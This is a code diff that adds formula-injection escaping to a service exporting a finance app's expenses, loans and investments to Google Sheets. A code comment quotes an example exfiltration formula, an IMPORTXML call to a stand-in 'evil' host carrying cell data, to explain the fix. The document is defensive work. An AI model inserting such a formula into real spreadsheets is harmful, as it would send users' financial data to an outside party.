@@ -10,6 +10,18 @@ import { Investment } from '../database/entities/investment.entity';
 import { encrypt, decrypt } from '../utils/crypto';
 import { ConnectSheetsDto } from './dto/connect-sheets.dto';
 
+/**
+ * Sheets evaluates USER_ENTERED strings, so a merchant or note such as
+ * `=IMPORTXML("https://evil/?d="&B2, ...)` would run in the user's sheet and could
+ * send their data out. Prefix text that starts like a formula with an apostrophe
+ * so it is stored as plain text; numbers and dates are untouched.
+ */
+function escapeFormulas(rows: unknown[][]): unknown[][] {
+  return rows.map((row) =>
+    row.map((cell) => (typeof cell === 'string' && /^[=+\-@]/.test(cell) ? `'${cell}` : cell)),
+  );
+}
+
 @Injectable()
 export class SheetsService {
   private readonly logger = new Logger(SheetsService.name);
@@ -184,10 +196,10 @@ export class SheetsService {
       {
         valueInputOption: 'USER_ENTERED',
         data: [
-          { range: 'Expenses!A1', values: expensesData },
-          { range: 'Loans!A1', values: loansData },
-          { range: 'Investments!A1', values: investmentsData },
-          { range: 'Summary!A1', values: summaryData },
+          { range: 'Expenses!A1', values: escapeFormulas(expensesData) },
+          { range: 'Loans!A1', values: escapeFormulas(loansData) },
+          { range: 'Investments!A1', values: escapeFormulas(investmentsData) },
+          { range: 'Summary!A1', values: escapeFormulas(summaryData) },
         ],
       },
       { headers: { Authorization: `Bearer ${accessToken}` } },
